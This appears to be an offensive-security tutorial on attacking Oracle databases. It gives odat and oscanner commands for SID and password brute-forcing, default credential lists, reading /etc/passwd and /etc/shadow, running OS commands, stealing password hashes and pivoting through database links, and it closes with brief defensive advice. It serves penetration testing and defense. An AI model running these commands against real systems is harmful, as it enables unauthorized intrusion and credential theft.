# Oracle Database Attack Guide

> Deep dive into Oracle database attacks at the protocol level. Covers TNS listener reconnaissance, SID enumeration, credential brute-force, exploitation with odat, and privilege escalation.

## Overview

Oracle databases present a large and complex attack surface due to their extensive feature set, multiple authentication mechanisms, and rich programmability layer. The primary attack entry point is the TNS (Transparent Network Substrate) listener, which runs on port 1521 by default. Unlike simpler databases, Oracle requires a SID (System Identifier) to connect, making enumeration a prerequisite for most attacks.

Oracle's architecture includes numerous built-in packages (UTL_FILE, DBMS_SCHEDULER, DBMS_LOB, CTXSYS, external tables) that can be abused for file access, OS command execution, and data exfiltration. The sheer number of default accounts created during installation (sys, system, scott, dbsnmp, outln, ctxsys, mdsys, and dozens more) makes credential brute-forcing highly effective.

## Phase 1: TNS Listener Scanning with oscanner

The TNS listener is Oracle's network gateway. It exposes information about the database instance, available services, and sometimes the operating system. oscanner automates the enumeration of TNS listener properties.

```bash
# Basic TNS listener scan
oscanner -s 192.168.1.100

# Custom port if listener is not on default 1521
oscanner -s 192.168.1.100 -P 1522
```

oscanner reports the Oracle version, operating system, TNS listener status, and available services. This information determines which exploits and techniques are applicable. Older Oracle versions (9i, 10g) are more likely to have exploitable misconfigurations, while 12c+ has stronger defaults.

## Phase 2: SID Enumeration

Oracle requires a valid SID to establish a connection. SIDs are not always predictable — while ORCL, XE, PROD, and TEST are common, many organizations use custom SIDs. odat's sidguesser module brute-forces SIDs against the listener.

```bash
# SID brute-force with default wordlist
odat sidguesser -s 192.168.1.100 -p 1521

# Custom SID wordlist for targeted environments
odat sidguesser -s 192.168.1.100 -p 1521 --sid-file custom_sids.txt
```

Key SID naming patterns to include in custom wordlists: company abbreviations, environment names (PROD, DEV, UAT, STAGE), project codes, and common defaults (ORCL, XE, ORACLE, DB01 through DB99).

## Phase 3: Credential Brute-Force with odat

Once a valid SID is discovered, credential brute-force targets Oracle's built-in accounts. Oracle installations create many default accounts, and organizations frequently leave these with default or weak passwords.

```bash
# Password guessing with all default accounts
odat passwordguesser -s 192.168.1.100 -d ORCL

# Targeted brute-force for specific accounts
odat passwordguesser -s 192.168.1.100 -d ORCL -U sys -P passwords.txt
```

Critical default accounts to test:
- sys/change_on_install — DBA privilege, full control
- system/manager — DBA privilege
- scott/tiger — Normal user, useful as foothold
- dbsnmp/dbsnmp — Monitoring account, limited but valuable
- outln/outln — Outline management, sometimes elevated
- ctxsys/ctxsys — Text engine, can be exploited for code execution

## Phase 4: Exploitation with odat

odat provides multiple exploitation modules. The `all` module runs every available test, but targeted modules are more useful in specific scenarios.

### File Read via UTL_FILE

```bash
odat utlfile -s 192.168.1.100 -d ORCL -U sys -P change_on_install \
  --getFile /etc/passwd
```

UTL_FILE allows reading and writing files in directories configured in the Oracle directory objects. With DBA privileges, directory objects can be created pointing to any OS path.

### OS Command Execution via DBMS_SCHEDULER

```bash
odat dbmsscheduler -s 192.168.1.100 -d ORCL -U sys -P change_on_install \
  --exec "id"
```

DBMS_SCHEDULER creates operating system jobs. This is the most reliable method for OS command execution on Oracle 10g+ when the account has sufficient privileges.

### OS Command Execution via External Tables

```bash
odat externaltable -s 192.168.1.100 -d ORCL -U sys -P change_on_install \
  --exec "cat /etc/shadow"
```

External tables can be configured to execute preprocessing scripts, effectively running OS commands and capturing output.

### Credential and Link Extraction

```bash
# Extract stored password hashes
odat passwordstealer -s 192.168.1.100 -d ORCL -U sys -P change_on_install

# Enumerate database links for lateral movement
odat dblink -s 192.168.1.100 -d ORCL -U sys -P change_on_install
```

Database links are particularly valuable — they contain credentials for other Oracle instances and can be used to pivot across the network without leaving the database layer.

## Phase 5: Privilege Escalation

Once inside Oracle with a low-privilege account, escalation paths include:

1. **Exploiting public package privileges** — Some packages like DBMS_SCHEDULER may be executable by PUBLIC, allowing low-privilege users to run commands
2. **SQL injection in PL/SQL packages** — Oracle ships with many PL/SQL packages, some of which have SQL injection vulnerabilities (check CVE databases for the target version)
3. **Abusing CREATE ANY PROCEDURE** — If the user can create procedures in other schemas, they can execute code with elevated privileges
4. **Exploiting DB links** — If a database link exists from a higher-privileged user, it may be exploitable for privilege escalation

## Detection and Defense

Oracle attacks are detected through audit logs (if enabled), failed authentication attempts in the listener log, and unusual DBMS_SCHEDULER job creation. Defenders should: enable auditing on all privileged operations, use strong passwords for all default accounts (or better, lock them), restrict TNS listener access to application servers only, and monitor for odat's known signature patterns in the listener log.
